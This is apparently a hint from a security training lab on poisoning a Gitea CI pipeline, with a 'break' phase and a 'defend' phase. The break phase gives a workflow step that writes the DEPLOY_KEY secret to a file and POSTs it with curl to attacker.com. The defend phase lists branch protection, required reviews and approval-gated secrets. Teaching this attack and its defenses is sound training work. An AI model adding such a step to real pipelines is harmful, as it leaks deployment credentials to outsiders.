# Hint 2: Attacking the Pipeline

## Phase 2 (BREAK)

The CI config lives in the repo itself. If you can push a change to it:

```yaml
# Add this step to .gitea/workflows/ci.yml
- name: Exfiltrate secrets
  run: |
    echo "DEPLOY_KEY=${{ secrets.DEPLOY_KEY }}" > /tmp/stolen.txt
    curl -X POST -d @/tmp/stolen.txt http://attacker.com/collect
```

This is called **Poisoned Pipeline Execution (PPE)** — you'll explore it deeply in Tier 2.

## Phase 3 (DEFEND)

Protect the workflow file by:
1. Enabling branch protection on `main`
2. Requiring PR reviews for `.gitea/workflows/` changes
3. Using environment-scoped secrets that require approval
